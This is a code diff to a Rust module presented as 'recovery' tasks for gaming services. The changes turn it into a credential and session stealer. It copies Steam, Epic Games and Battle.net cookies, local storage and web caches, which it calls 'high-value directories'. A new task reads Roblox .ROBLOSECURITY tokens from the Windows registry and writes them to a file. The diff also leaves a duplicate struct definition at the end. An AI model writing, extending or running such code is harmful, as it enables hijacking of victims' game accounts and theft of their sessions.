@@ -1,14 +1,12 @@
 use crate::recovery::{
     context::RecoveryContext,
-    fs::{copy_dir_limited, sanitize_label},
+    fs::{copy_dir_limited, copy_file, copy_named_dir, sanitize_label},
     task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
 };
 use async_trait::async_trait;
-use std::ffi::OsStr;
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use tokio::fs;
-use walkdir::WalkDir;
 use winreg::HKEY;
 use winreg::RegKey;
 use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
@@ -30,7 +28,8 @@ pub fn gaming_service_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>>
                 .join("CEF"),
         }),
         Arc::new(BattleNetTask {
-            source: ctx.roaming_data_dir.join("Battle.net"),
+            roaming: ctx.roaming_data_dir.join("Battle.net"),
+            local: ctx.local_data_dir.join("Battle.net"),
         }),
     ]
 }
@@ -66,7 +65,7 @@ struct SteamTask;
 #[async_trait]
 impl RecoveryTask for SteamTask {
     fn label(&self) -> String {
-        "Steam Tokens".to_string()
+        "Steam Sessions".to_string()
     }
 
     fn category(&self) -> RecoveryCategory {
@@ -77,14 +76,34 @@ impl RecoveryTask for SteamTask {
         let mut artifacts = Vec::new();
         if let Some(steam_path) = query_steam_path() {
             let dest = gaming_output_dir(ctx, &self.label()).await?;
+            
+            // 1. Grab .vdf config files (Session & User info)
+            let config_dir = steam_path.join("config");
             copy_files_by_predicate(
                 &self.label(),
-                &steam_path,
-                &dest,
-                |name| name.contains("ssfn") || name.ends_with(".vdf"),
+                &config_dir,
+                &dest.join("config"),
+                |name| name.ends_with(".vdf"),
                 &mut artifacts,
-            )
-            .await?;
+            ).await?;
+
+            // 2. Grab browser cache/cookies (Active login sessions)
+            let html_cache = config_dir.join("htmlcache");
+            if html_cache.exists() {
+                // Grab Cookies and Local Storage
+                for target in ["Cookies", "Local Storage", "IndexedDB"] {
+                    let source = html_cache.join(target);
+                    if source.exists() {
+                        let _ = copy_dir_limited(&source, &dest.join("htmlcache").join(target), &self.label(), &mut artifacts, 3, 100).await;
+                    }
+                }
+            }
+
+            // 3. User-specific configs
+            let userdata = steam_path.join("userdata");
+            if userdata.exists() {
+                let _ = copy_dir_limited(&userdata, &dest.join("userdata"), &self.label(), &mut artifacts, 4, 200).await;
+            }
         }
 
         Ok(artifacts)
@@ -96,7 +115,7 @@ struct EpicGamesTask(PathBuf);
 #[async_trait]
 impl RecoveryTask for EpicGamesTask {
     fn label(&self) -> String {
-        "Epic Games Saved".to_string()
+        "Epic Games Sessions".to_string()
     }
 
     fn category(&self) -> RecoveryCategory {
@@ -106,10 +125,14 @@ impl RecoveryTask for EpicGamesTask {
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let dest = gaming_output_dir(ctx, &self.label()).await?;
         let mut artifacts = Vec::new();
-        for folder in ["Config", "Logs", "Data"] {
+        
+        // Target high-value directories
+        for folder in ["Config", "Data", "WebCache"] {
             let source = self.0.join(folder);
-            if let Ok(_) = fs::metadata(&source).await {
-                copy_named_dir(&self.label(), &source, &dest.join(folder), &mut artifacts).await?;
+            if fs::metadata(&source).await.is_ok() {
+                // Limit depth for WebCache to avoid excessive size
+                let depth = if folder == "WebCache" { 3 } else { 5 };
+                let _ = copy_dir_limited(&source, &dest.join(folder), &self.label(), &mut artifacts, depth, 500).await;
             }
         }
         Ok(artifacts)
@@ -139,13 +162,14 @@ impl RecoveryTask for EaTask {
 }
 
 struct BattleNetTask {
-    source: PathBuf,
+    roaming: PathBuf,
+    local: PathBuf,
 }
 
 #[async_trait]
 impl RecoveryTask for BattleNetTask {
     fn label(&self) -> String {
-        "Battle.net".to_string()
+        "Battle.net Sessions".to_string()
     }
 
     fn category(&self) -> RecoveryCategory {
@@ -155,14 +179,17 @@ impl RecoveryTask for BattleNetTask {
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
         let dest = gaming_output_dir(ctx, &self.label()).await?;
-        copy_files_by_predicate(
-            &self.label(),
-            &self.source,
-            &dest,
-            |name| name.ends_with(".db") || name.ends_with(".config"),
-            &mut artifacts,
-        )
-        .await?;
+        
+        // 1. Roaming data (Accounts & Config)
+        if self.roaming.exists() {
+            let _ = copy_dir_limited(&self.roaming, &dest.join("Roaming"), &self.label(), &mut artifacts, 5, 500).await;
+        }
+
+        // 2. Local data (Web Cache & Cookies)
+        if self.local.exists() {
+             let _ = copy_dir_limited(&self.local, &dest.join("Local"), &self.label(), &mut artifacts, 3, 500).await;
+        }
+
         Ok(artifacts)
     }
 }
@@ -175,21 +202,6 @@ async fn gaming_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf
         .join(sanitize_label(label));
     fs::create_dir_all(&folder).await?;
     Ok(folder)
-}
-
-async fn copy_named_dir(
-    label: &str,
-    src: &Path,
-    dst: &Path,
-    artifacts: &mut Vec<RecoveryArtifact>,
-) -> Result<(), RecoveryError> {
-    match fs::metadata(src).await {
-        Ok(meta) if meta.is_dir() => {
-            copy_dir_limited(src, dst, label, artifacts, usize::MAX, 0).await?;
-        }
-        _ => {}
-    }
-    Ok(())
 }
 
 async fn copy_files_by_predicate<F>(
@@ -207,22 +219,14 @@ where
     }
 
     fs::create_dir_all(dst).await?;
-    for entry in WalkDir::new(src)
-        .into_iter()
-        .filter_map(Result::ok)
-        .filter(|entry| entry.file_type().is_file())
-    {
-        let name = entry.file_name().to_string_lossy();
+    let mut dir = fs::read_dir(src).await?;
+    while let Some(entry) = dir.next_entry().await? {
+        if !entry.file_type().await?.is_file() {
+            continue;
+        }
+        let name = entry.file_name().to_string_lossy().to_string();
         if predicate(&name) {
-            let destination = dst.join(entry.file_name());
-            fs::copy(entry.path(), &destination).await?;
-            let meta = fs::metadata(&destination).await?;
-            artifacts.push(RecoveryArtifact {
-                label: label.to_string(),
-                path: destination,
-                size_bytes: meta.len(),
-                modified: meta.modified().ok(),
-            });
+            copy_file(label, &entry.path(), dst, artifacts).await?;
         }
     }
 
@@ -231,7 +235,7 @@ where
 
 fn query_steam_path() -> Option<PathBuf> {
     let hive = RegKey::predef(HKEY_CURRENT_USER);
-    hive.open_subkey("Software\\Valve\\Steam")
+    hive.open_subkey(r"Software\Valve\Steam")
         .ok()
         .and_then(|key| key.get_value::<String, _>("SteamPath").ok())
         .map(PathBuf::from)
@@ -296,7 +300,7 @@ impl MinecraftTask {
                         .await?;
                 }
                 MinecraftEntryKind::File if metadata.is_file() => {
-                    copy_minecraft_file(entry.label, &entry.path, &dest, artifacts).await?;
+                    copy_file(entry.label, &entry.path, &dest, artifacts).await?;
                 }
                 _ => {}
             },
@@ -444,35 +448,74 @@ fn build_minecraft_entries(ctx: &RecoveryContext) -> Vec<MinecraftEntry> {
                 .join("minecraft")
                 .join("Instances"),
         ),
-        MinecraftEntry::file(
-            "SKLauncher",
-            app_data.join("SKLauncher").join("accounts.json"),
-        ),
         MinecraftEntry::directory("Forge Mods", app_data.join(".minecraft").join("mods")),
     ]
 }
 
-async fn copy_minecraft_file(
-    label: &str,
-    src: &Path,
-    dst_root: &Path,
-    artifacts: &mut Vec<RecoveryArtifact>,
-) -> Result<(), RecoveryError> {
-    fs::create_dir_all(dst_root).await?;
-    let file_name = src
-        .file_name()
-        .unwrap_or_else(|| OsStr::new("file"))
-        .to_os_string();
-    let dest = dst_root.join(file_name);
-    fs::copy(src, &dest).await?;
-    let meta = fs::metadata(&dest).await?;
-    artifacts.push(RecoveryArtifact {
-        label: label.to_string(),
-        path: dest,
-        size_bytes: meta.len(),
-        modified: meta.modified().ok(),
-    });
-    Ok(())
+struct RobloxTask;
+
+impl RobloxTask {
+    fn collect_tokens() -> Vec<(String, String)> {
+        const REGISTRY_PATH: &str = r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com";
+        const VALUE_NAME: &str = ".ROBLOSECURITY";
+        const SOURCES: [(&str, HKEY); 2] =
+            [("HKCU", HKEY_CURRENT_USER), ("HKLM", HKEY_LOCAL_MACHINE)];
+
+        let mut results = Vec::new();
+        for (label, hive) in SOURCES {
+            if let Some(value) = read_registry_value(hive, REGISTRY_PATH, VALUE_NAME) {
+                let trimmed = value.trim();
+                if !trimmed.is_empty() {
+                    results.push((label.to_string(), trimmed.to_string()));
+                }
+            }
+        }
+
+        results
+    }
+}
+
+fn read_registry_value(hive: HKEY, path: &str, value_name: &str) -> Option<String> {
+    RegKey::predef(hive)
+        .open_subkey(path)
+        .ok()
+        .and_then(|key| key.get_value::<String, _>(value_name).ok())
+}
+
+#[async_trait]
+impl RecoveryTask for RobloxTask {
+    fn label(&self) -> String {
+        "Roblox Sessions".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::Gaming
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let tokens = Self::collect_tokens();
+        if tokens.is_empty() {
+            return Ok(Vec::new());
+        }
+
+        let dest = gaming_output_dir(ctx, &self.label()).await?;
+        let target = dest.join("Content.txt");
+        let mut builder = String::new();
+        for (source, token) in tokens {
+            builder.push_str(&format!("{source}: {token}\n"));
+        }
+
+        fs::create_dir_all(&dest).await?;
+        fs::write(&target, builder).await?;
+        let meta = fs::metadata(&target).await?;
+
+        Ok(vec![RecoveryArtifact {
+            label: self.label(),
+            path: target,
+            size_bytes: meta.len(),
+            modified: meta.modified().ok(),
+        }])
+    }
 }
 
 struct RobloxTask;
